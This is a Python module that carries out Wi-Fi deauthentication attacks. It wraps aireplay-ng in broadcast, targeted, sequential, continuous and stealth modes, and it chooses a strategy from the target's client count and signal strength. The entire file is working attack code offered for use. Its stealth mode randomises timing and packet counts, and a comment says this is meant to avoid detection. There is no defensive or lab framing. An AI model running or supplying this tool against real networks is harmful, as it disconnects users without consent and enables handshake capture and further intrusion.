#!/usr/bin/env python3
"""
Deauthentication Attack Module

Implements various deauth strategies for forcing client reconnections.
Supports targeted and broadcast deauth with intelligent timing.
"""

import subprocess
import threading
import time
import logging
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass
from enum import Enum
from datetime import datetime, timedelta

logger = logging.getLogger(__name__)


class DeauthStrategy(Enum):
    """Deauthentication strategies"""
    BROADCAST = "broadcast"  # Deauth all clients
    TARGETED = "targeted"  # Deauth specific client
    SEQUENTIAL = "sequential"  # Deauth clients one by one
    AGGRESSIVE = "aggressive"  # Continuous deauth
    STEALTH = "stealth"  # Low-rate deauth to avoid detection


@dataclass
class DeauthConfig:
    """Configuration for deauth attacks"""
    strategy: DeauthStrategy = DeauthStrategy.BROADCAST
    packet_count: int = 10  # Packets per burst
    burst_count: int = 5  # Number of bursts
    burst_interval: float = 5.0  # Seconds between bursts

    # Rate limiting
    max_packets_per_second: int = 100
    cooldown_period: float = 10.0  # Seconds between attack rounds

    # Targeting
    prioritize_active_clients: bool = True
    skip_broadcast_if_clients: bool = True

    # Stealth mode
    randomize_timing: bool = False
    vary_packet_count: bool = False


class DeauthController:
    """Controls deauthentication attacks"""

    def __init__(self, interface: str):
        """
        Initialize deauth controller

        Args:
            interface: Injection-capable interface
        """
        self.interface = interface
        self.is_attacking = False
        self.attack_thread: Optional[threading.Thread] = None

        # Statistics
        self.stats = {
            "total_packets_sent": 0,
            "total_bursts": 0,
            "clients_deauthed": set(),
            "start_time": None,
            "last_packet_time": None
        }

        # Rate limiting
        self.packet_timestamps: List[datetime] = []
        self.rate_limit_lock = threading.Lock()

    def deauth_network(
        self,
        bssid: str,
        clients: Optional[List[str]] = None,
        config: Optional[DeauthConfig] = None
    ) -> bool:
        """
        Deauthenticate a network or specific clients

        Args:
            bssid: Target network BSSID
            clients: List of client MACs (None for broadcast)
            config: Deauth configuration

        Returns:
            True if attack started successfully
        """
        if self.is_attacking:
            logger.warning("Deauth attack already in progress")
            return False

        config = config or DeauthConfig()
        self.is_attacking = True
        self.stats["start_time"] = datetime.now()

        # Start attack thread
        self.attack_thread = threading.Thread(
            target=self._attack_worker,
            args=(bssid, clients, config),
            daemon=True
        )
        self.attack_thread.start()

        logger.info(f"Started {config.strategy.value} deauth attack on {bssid}")
        return True

    def stop_deauth(self) -> Dict:
        """
        Stop ongoing deauth attack

        Returns:
            Attack statistics
        """
        self.is_attacking = False

        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=2)

        # Calculate duration
        if self.stats["start_time"]:
            duration = (datetime.now() - self.stats["start_time"]).total_seconds()
            self.stats["duration"] = duration
            self.stats["packets_per_second"] = (
                self.stats["total_packets_sent"] / duration if duration > 0 else 0
            )

        logger.info(f"Deauth stopped. Sent {self.stats['total_packets_sent']} packets")
        return self.stats.copy()

    def _attack_worker(
        self,
        bssid: str,
        clients: Optional[List[str]],
        config: DeauthConfig
    ):
        """Worker thread for deauth attacks"""
        import random

        if config.strategy == DeauthStrategy.BROADCAST:
            self._broadcast_attack(bssid, config)

        elif config.strategy == DeauthStrategy.TARGETED and clients:
            for client in clients:
                if not self.is_attacking:
                    break
                self._targeted_attack(bssid, client, config)
                time.sleep(config.burst_interval)

        elif config.strategy == DeauthStrategy.SEQUENTIAL and clients:
            for _ in range(config.burst_count):
                if not self.is_attacking:
                    break
                for client in clients:
                    if not self.is_attacking:
                        break
                    self._send_deauth_burst(bssid, client, config.packet_count)
                    time.sleep(1)  # Brief pause between clients
                time.sleep(config.burst_interval)

        elif config.strategy == DeauthStrategy.AGGRESSIVE:
            while self.is_attacking:
                if clients and config.skip_broadcast_if_clients:
                    # Rotate through clients
                    for client in clients:
                        if not self.is_attacking:
                            break
                        self._send_deauth_burst(bssid, client, config.packet_count)
                else:
                    self._send_deauth_burst(bssid, None, config.packet_count)

                # Minimal delay
                time.sleep(0.5)

        elif config.strategy == DeauthStrategy.STEALTH:
            for _ in range(config.burst_count):
                if not self.is_attacking:
                    break

                # Random packet count for stealth
                packet_count = config.packet_count
                if config.vary_packet_count:
                    packet_count = random.randint(1, config.packet_count)

                # Random target
                target = None
                if clients and random.random() > 0.3:  # 70% chance to target specific client
                    target = random.choice(clients)

                self._send_deauth_burst(bssid, target, packet_count)

                # Random delay for stealth
                delay = config.burst_interval
                if config.randomize_timing:
                    delay = random.uniform(
                        config.burst_interval * 0.5,
                        config.burst_interval * 1.5
                    )
                time.sleep(delay)

        self.is_attacking = False

    def _broadcast_attack(self, bssid: str, config: DeauthConfig):
        """Execute broadcast deauth attack"""
        for i in range(config.burst_count):
            if not self.is_attacking:
                break

            self._send_deauth_burst(bssid, None, config.packet_count)
            self.stats["total_bursts"] += 1

            if i < config.burst_count - 1:
                time.sleep(config.burst_interval)

    def _targeted_attack(self, bssid: str, client: str, config: DeauthConfig):
        """Execute targeted deauth attack"""
        for i in range(config.burst_count):
            if not self.is_attacking:
                break

            self._send_deauth_burst(bssid, client, config.packet_count)
            self.stats["total_bursts"] += 1
            self.stats["clients_deauthed"].add(client)

            if i < config.burst_count - 1:
                time.sleep(config.burst_interval)

    def _send_deauth_burst(
        self,
        bssid: str,
        client: Optional[str],
        packet_count: int
    ) -> bool:
        """
        Send a burst of deauth packets

        Args:
            bssid: Target AP BSSID
            client: Target client MAC (None for broadcast)
            packet_count: Number of packets to send

        Returns:
            True if successful
        """
        # Check rate limiting
        if not self._check_rate_limit():
            logger.warning("Rate limit exceeded, skipping burst")
            return False

        # Build aireplay-ng command
        cmd = [
            "sudo", "aireplay-ng",
            "--deauth", str(packet_count),
            "-a", bssid
        ]

        if client:
            cmd.extend(["-c", client])
            logger.debug(f"Deauth {client} from {bssid} ({packet_count} packets)")
        else:
            logger.debug(f"Broadcast deauth on {bssid} ({packet_count} packets)")

        cmd.append(self.interface)

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )

            # Update statistics
            self.stats["total_packets_sent"] += packet_count
            self.stats["last_packet_time"] = datetime.now()
            self._record_packet_timestamp()

            # Check for common errors
            if "No such BSSID available" in result.stdout:
                logger.warning(f"BSSID {bssid} not found")
                return False
            elif "write failed" in result.stderr.lower():
                logger.error("Injection failed - interface may not support injection")
                return False

            return True

        except subprocess.TimeoutExpired:
            logger.warning("Deauth command timed out")
            return False
        except Exception as e:
            logger.error(f"Failed to send deauth: {e}")
            return False

    def _check_rate_limit(self) -> bool:
        """Check if we're within rate limits"""
        with self.rate_limit_lock:
            now = datetime.now()

            # Remove old timestamps (older than 1 second)
            self.packet_timestamps = [
                ts for ts in self.packet_timestamps
                if (now - ts).total_seconds() < 1
            ]

            # Check if we're at limit
            return len(self.packet_timestamps) < 10  # Max 10 bursts per second

    def _record_packet_timestamp(self):
        """Record packet timestamp for rate limiting"""
        with self.rate_limit_lock:
            self.packet_timestamps.append(datetime.now())

    def test_injection(self) -> Tuple[bool, float]:
        """
        Test injection capability of the interface

        Returns:
            Tuple of (success, injection_rate)
        """
        try:
            result = subprocess.run(
                ["sudo", "aireplay-ng", "--test", self.interface],
                capture_output=True,
                text=True,
                timeout=30
            )

            # Parse injection success rate
            if "Injection is working!" in result.stdout:
                # Try to extract percentage
                import re
                match = re.search(r'(\d+)%', result.stdout)
                if match:
                    rate = float(match.group(1))
                    logger.info(f"Injection test passed: {rate}% success rate")
                    return True, rate
                else:
                    logger.info("Injection test passed")
                    return True, 100.0
            else:
                logger.warning("Injection test failed")
                return False, 0.0

        except Exception as e:
            logger.error(f"Injection test error: {e}")
            return False, 0.0

    def calculate_optimal_strategy(
        self,
        client_count: int,
        signal_strength: int
    ) -> DeauthConfig:
        """
        Calculate optimal deauth strategy based on target characteristics

        Args:
            client_count: Number of associated clients
            signal_strength: Target signal strength (dBm)

        Returns:
            Optimized deauth configuration
        """
        config = DeauthConfig()

        # Many clients: use broadcast
        if client_count > 5:
            config.strategy = DeauthStrategy.BROADCAST
            config.burst_count = 3
            config.packet_count = 15

        # Few clients: targeted approach
        elif client_count > 0:
            config.strategy = DeauthStrategy.TARGETED
            config.burst_count = 5
            config.packet_count = 10

        # No known clients: aggressive broadcast
        else:
            config.strategy = DeauthStrategy.AGGRESSIVE
            config.burst_count = 10
            config.packet_count = 5

        # Adjust for signal strength
        if signal_strength < -70:  # Weak signal
            config.packet_count = min(config.packet_count * 2, 30)
            config.burst_count = min(config.burst_count * 2, 10)
        elif signal_strength > -40:  # Strong signal
            config.strategy = DeauthStrategy.STEALTH
            config.randomize_timing = True

        logger.debug(f"Optimal strategy: {config.strategy.value}")
        return config